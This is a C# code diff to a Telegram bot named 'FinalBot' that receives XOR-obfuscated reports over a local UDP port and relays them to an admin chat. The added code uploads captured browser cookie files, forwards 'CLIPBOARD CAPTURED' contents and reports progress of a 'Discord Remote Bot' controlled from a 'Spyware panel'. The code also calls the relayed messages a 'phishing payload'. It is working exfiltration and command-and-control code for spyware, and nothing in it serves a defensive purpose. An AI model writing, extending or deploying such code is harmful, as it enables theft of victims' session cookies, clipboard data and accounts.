@@ -13,6 +13,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Reflection;
+using File = System.IO.File;
 
 namespace FinalBot
 {
@@ -136,33 +137,137 @@ namespace FinalBot
             }
         }
 
+        private int _lastLogMessageId = 0;
+
         private async Task StartUdpListener()
         {
             int port = 51337;
             try
             {
-                // Fix: Bind ONLY to loopback to avoid Windows Firewall popup
                 var localEndpoint = new IPEndPoint(IPAddress.Loopback, port);
-                using (var udpClient = new UdpClient(localEndpoint))
+                using var udpClient = new UdpClient(localEndpoint);
+                Console.WriteLine($"[UDP] Listening on 127.0.0.1:{port}...");
+                while (_isRunning)
                 {
-                    Console.WriteLine($"[UDP] Listening for local reports on 127.0.0.1:{port}...");
-                    while (_isRunning)
+                    try
                     {
                         var result = await udpClient.ReceiveAsync();
-                        string message = Encoding.UTF8.GetString(result.Buffer);
-                        Console.WriteLine($"[UDP] Message received: {message}");
+                        string raw = Encoding.UTF8.GetString(result.Buffer);
+                        Console.WriteLine($"[UDP] Received: {raw.Substring(0, Math.Min(80, raw.Length))}...");
 
-                        await _botClient.SendTextMessageAsync(
+                        // Decrypt phishing payload
+                        string decrypted = DecryptString(raw);
+                        if (string.IsNullOrEmpty(decrypted)) decrypted = raw;
+
+                        if (decrypted.StartsWith("FILE:"))
+                        {
+                            string filePath = decrypted.Substring(5).Trim();
+                            if (File.Exists(filePath))
+                            {
+                                using var stream = File.OpenRead(filePath);
+                                await _botClient.SendDocumentAsync(
+                                    chatId: _adminId,
+                                    document: InputFile.FromStream(stream, Path.GetFileName(filePath)),
+                                    caption: $"📦 <b>Cookies Captured:</b> <code>{Path.GetFileName(filePath)}</code>",
+                                    parseMode: ParseMode.Html
+                                );
+                                continue; 
+                            }
+                        }
+
+                        // Progress Bar Logic (Discord Bot)
+                        if (decrypted.Contains("Discord Progress:"))
+                        {
+                            // Message format: "Discord Progress: [BAR] XX% | Status"
+                            int lastMsgId = CommandHandler.GetLastDiscordMessageId();
+                            if (lastMsgId != 0)
+                            {
+                                try
+                                {
+                                    await _botClient.EditMessageTextAsync(
+                                        chatId: _adminId,
+                                        messageId: lastMsgId,
+                                        text: "🎮 <b>Discord Remote Bot</b>\n━━━━━━━━━━━━━━━━━━\n" + decrypted + "\n━━━━━━━━━━━━━━━━━━",
+                                        parseMode: Telegram.Bot.Types.Enums.ParseMode.Html
+                                    );
+                                } catch { }
+                            }
+
+                            if (decrypted.Contains("100%") && decrypted.Contains("OK"))
+                            {
+                                await _botClient.SendTextMessageAsync(_adminId, "✅ <b>Discord Bot Ready!</b>\nUse the Spyware panel to control it.", parseMode: Telegram.Bot.Types.Enums.ParseMode.Html);
+                            }
+                        }
+                        else if (decrypted.Contains("Discord Remote Bot:") && decrypted.Contains("%"))
+                        {
+                            if (_lastLogMessageId != 0)
+                            {
+                                try
+                                {
+                                    await _botClient.EditMessageTextAsync(
+                                        chatId: _adminId,
+                                        messageId: _lastLogMessageId,
+                                        text: decrypted,
+                                        parseMode: ParseMode.Html
+                                    );
+                                    continue; 
+                                }
+                                catch { _lastLogMessageId = 0; } // Fallback to new message
+                            }
+                        }
+                        else if (decrypted.StartsWith("CLIPBOARD:"))
+                        {
+                            string clipboardContent = decrypted.Substring(10).Trim();
+                            await _botClient.SendTextMessageAsync(
+                                chatId: _adminId,
+                                text: $"📋 <b>CLIPBOARD CAPTURED</b>\n━━━━━━━━━━━━━━━━━━\n<code>{clipboardContent}</code>\n━━━━━━━━━━━━━━━━━━",
+                                parseMode: ParseMode.Html
+                            );
+                            continue;
+                        }
+
+                        // Default: Send new message and store ID
+                        var msg = await _botClient.SendTextMessageAsync(
                             chatId: _adminId,
-                            text: $"🎯 <b>PHISH REPORT</b>\n━━━━━━━━━━━━━━━━━━\n{message}\n━━━━━━━━━━━━━━━━━━",
+                            text: $"🎯 <b>SYSTEM LOG</b>\n━━━━━━━━━━━━━━━━━━\n{decrypted}\n━━━━━━━━━━━━━━━━━━",
                             parseMode: ParseMode.Html
                         );
+                        
+                        _lastLogMessageId = msg.MessageId;
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[UDP ERROR] {ex.Message}");
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[UDP ERROR] {ex.Message}");
+                Console.WriteLine($"[UDP BIND ERROR] {ex.Message}");
+            }
+        }
+
+        private string DecryptString(string base64Encoded)
+        {
+            if (string.IsNullOrEmpty(base64Encoded)) return null;
+            try
+            {
+                byte[] data = Convert.FromBase64String(base64Encoded);
+                byte[] salt = Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
+                byte[] xorData = new byte[data.Length];
+
+                for (int i = 0; i < data.Length; i++)
+                {
+                    xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
+                }
+
+                string result = Encoding.UTF8.GetString(xorData);
+                // Return original if no printable chars, but here we expect text
+                return result;
+            }
+            catch
+            {
+                return null;
             }
         }
 
